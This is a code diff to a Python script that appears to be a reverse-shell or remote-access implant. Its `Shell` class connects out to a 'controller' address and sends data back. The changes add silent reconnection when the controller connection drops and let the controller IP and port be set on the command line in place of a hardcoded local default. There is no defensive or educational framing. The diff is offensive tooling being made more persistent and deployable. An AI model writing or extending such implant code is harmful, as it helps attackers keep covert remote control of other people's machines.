@@ -3,6 +3,7 @@ import socket
 import sys
 import time
 import netifaces
+import argparse
 
 if sys.platform.startswith('linux'):
     # linux only
@@ -152,11 +153,25 @@ class Shell(Enumerate):
         except KeyboardInterrupt:
             self.socket.close()
             sys.exit(0)
+        except ConnectionResetError:
+            # Lost connection with server, attempt to re-establish connection
+            self.socket.close()  # close socket
+            self.__init__(self.ip, self.port, self.buffer)  # recreate socket
+            self.connect()  # attempt to reconnect
 
     def send(self, message):
         self.socket.sendall(bytes(message, "utf-8"))
 
 
+def take_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--ip", "-a", type=str, help="IP address of controller", default="127.0.0.1")
+    parser.add_argument("--port", "-p", type=int, help="Port of controller", default=1234)
+    return parser.parse_args()
+
+
 if __name__ == '__main__':
-    shell = Shell('127.0.0.1', 6969, 2048)
+    args = take_args()
+    shell = Shell(args.ip, args.port, 2048)
     shell.connect()
+
